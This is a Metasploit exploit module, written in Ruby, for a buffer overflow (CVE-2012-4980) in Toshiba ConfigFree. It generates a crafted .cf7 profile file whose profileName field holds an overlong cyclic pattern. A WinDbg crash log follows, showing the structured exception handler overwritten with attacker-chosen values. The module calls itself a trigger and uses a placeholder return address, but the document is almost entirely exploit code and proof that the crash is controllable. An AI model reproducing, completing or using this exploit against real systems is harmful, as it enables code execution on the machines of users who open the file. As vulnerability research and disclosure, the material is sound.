require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote

	include Msf::Exploit::FILEFORMAT

	def initialize(info = {})
		super(update_info(info,
			'Name'           => 'TOSHIBA CONFIGFREE CF7 Buffer Overflow',
			'Description'    => %q{
					This module is simply a trigger for the Toshiba
				Configfree profileName element issue.
			},
			'License'        => 'BSD_LICENSE',
			'Author'         => [ 'Mario Ceballos' ],
			'References'     =>
				[
					[ 'CVE', '2012-4980' ],
					[ 'URL', 'http://www.reactionpenetrationtesting.co.uk/configfree-bof-profilename.html' ],
				],
			'Platform'          => [ 'win' ],
			'DefaultOptions' =>
				{
					'EXITFUNC' => 'thread',
				},
			'Payload' =>
				{
					'Space'         => 1000,
					'BadChars'      => "",
				},
			'Targets'        =>
				[
					[
						'Toshiba ConfigFree 7.1.0.29',
						{
							'Ret'    => 0xdeadbeef, 
						}
					],

				],
			'DisclosureDate' => 'Jul 13 2012',
			'DefaultTarget'  => 0))

			register_options(
			[
				OptString.new('FILENAME', [ true, 'The output file name.', 'msf.cf7']),
			], self.class)

	end

	def exploit


		sploit = pattern_create(3024)
		sploit[1036, 8] = "BBBBAAAA"

		cf7 = %Q|<?xml version="1.0"?>
<ConfigFreeProfile xmlns="http://www.toshiba.com/Network/ConfigFree/Profile/v1"><Profile000><PFName><Class>PFname</Class><profileName>#{sploit}</profileName><comment></comment><captureDate>10/29/2012 9:40:08 AM</captureDate><runApp></runApp><iconPath></iconPath><switchSound></switchSound><balloonSound></balloonSound><filter>823</filter><iconID>0</iconID><ProfileVersion>7000</ProfileVersion><ProfileType>0</ProfileType><autoSwitchFlag>0</autoSwitchFlag><balloonSkin></balloonSkin><balloonAlpha>0</balloonAlpha><hotspotText></hotspotText><fireImage></fireImage><tagImage></tagImage><tempText></tempText><DNS_UseDomainNameDevolution>1</DNS_UseDomainNameDevolution><DNS_SuffixOrder></DNS_SuffixOrder><hash>c6bf5fd26f7b28c0b4ffba3ba4eeca54</hash></PFName><UserAccount><useUacElevation>0</useUacElevation><permitShare>0</permitShare><shareUserGroup>0</shareUserGroup></UserAccount><Settings><Security><fileShare>1</fileShare><enableVPN>0</enableVPN><VPNPath></VPNPath><winSecFlag>1</winSecFlag></Security><Internet><Class>Internet</Class><autoConfigURL></autoConfigURL><enableAutodial>0</enableAutodial><proxyEnable>0</proxyEnable><globalUserOffline>0</globalUserOffline><startPage>http://go.microsoft.com/fwlink/?LinkId=69157</startPage><secondaryStartPage></secondaryStartPage><noNetAutodial>0</noNetAutodial><proxyOverride></proxyOverride><proxyServer></proxyServer><defaultConnectionSettings>8</defaultConnectionSettings></Internet><Dialup><Class>Dialup</Class><defaultDUN></defaultDUN><isUserOnly>0</isUserOnly><launchThisDUN>0</launchThisDUN><retryTime>0</retryTime><switchOptionFlag>0</switchOptionFlag><runApp></runApp><modem></modem></Dialup><Printer><Class>Printer</Class><UserName>mc</UserName><defaultPrinter>Microsoft XPS Document Writer</defaultPrinter></Printer><NetworkDevice><number>1</number><DeviceIndex0000><Class>NetworkDevice</Class><deviceDesc>Intel(R) PRO/1000 MT Network Connection</deviceDesc><deviceID></deviceID><hardwareID></hardwareID><driverKey></driverKey><status>1</status><WiFi>0</WiFi><Ori>0</Ori><ASSupprotWired>1</ASSupprotWired><deviceType>0</deviceType><NicSec_ICF>0</NicSec_ICF><NicSec_ICS>0</NicSec_ICS><NicSec_ICStype>0</NicSec_ICStype><Tcpip><Class>Tcpip</Class><InterfaceDesc>Intel(R) PRO/1000 MT Network Connection</InterfaceDesc><AdapterName>{CEBCCA7D-0523-42FC-A731-6492EBC01DDA}</AdapterName><NetworkName>Local Area Connection</NetworkName><deviceID></deviceID><MAC>00-0c-29-51-1a-e5</MAC><EnableIPDHCP>1</EnableIPDHCP><IPAddress>192.168.53.131</IPAddress><SubnetMask></SubnetMask><Gateway></Gateway><GatewayMetric>0</GatewayMetric><DHCPServer></DHCPServer><EnableDNSDHCP>1</EnableDNSDHCP><DNSServer1></DNSServer1><DNSServer2></DNSServer2><EnableWINSDHCP>1</EnableWINSDHCP><WINSServer1></WINSServer1><WINSServer2></WINSServer2><IAS><IPADDRESS></IPADDRESS><SUBNET></SUBNET><GATEWAY></GATEWAY><GWMETRIC>30</GWMETRIC><DNS></DNS><FLAG>1</FLAG><DNSREGENA>1</DNSREGENA><DNSREGNAME>0</DNSREGNAME><DNSSUFFIX></DNSSUFFIX><IPV6ADDRESS></IPV6ADDRESS><IPV6SUBNET></IPV6SUBNET><IPV6GATEWAY></IPV6GATEWAY><IPV6GWMETRIC></IPV6GWMETRIC><IPV6DNS></IPV6DNS><IPV6DNSREGENA>0</IPV6DNSREGENA><IPV6DNSREGNAME>0</IPV6DNSREGNAME><IPV6DNSSUFFIX></IPV6DNSSUFFIX><ADAPTERINFO></ADAPTERINFO></IAS></Tcpip></DeviceIndex0000></NetworkDevice></Settings></Profile000></ConfigFreeProfile>
			|

		file_create(cf7)
	end

end
__END__
(1dc.36c): Access violation - code c0000005 (first chance)
First chance exceptions are reported before any exception handling.
This exception may be expected and handled.
eax=00000bd0 ebx=6c42336c ecx=6c42336c edx=7efefeff esi=001299a8 edi=6c42336c
eip=6ff83c0c esp=00129828 ebp=00129830 iopl=0         nv up ei pl nz na po nc
cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
*** ERROR: Module load completed but symbols could not be loaded for C:\Windows\WinSxS\x86_microsoft.vc80.mfc_1fc8b3b9a1e18e3b_8.0.50727.762_none_0c178a139ee2a7ed\MFC80.DLL
MFC80+0x23c0c:
6ff83c0c 8b03            mov     eax,dword ptr [ebx]  ds:0023:6c42336c=????????
0:000> !exchain
00129db4: 41414141
Invalid exception stack at 42424242
0:000> dd esi
001299a8  41306141 61413161 33614132 41346141
001299b8  61413561 37614136 41386141 62413961
001299c8  31624130 41326241 62413362 35624134
001299d8  41366241 62413762 39624138 41306341
001299e8  63413163 33634132 41346341 63413563
001299f8  37634136 41386341 64413963 31644130
00129a08  41326441 64413364 35644134 41366441
00129a18  64413764 39644138 41306541 65413165

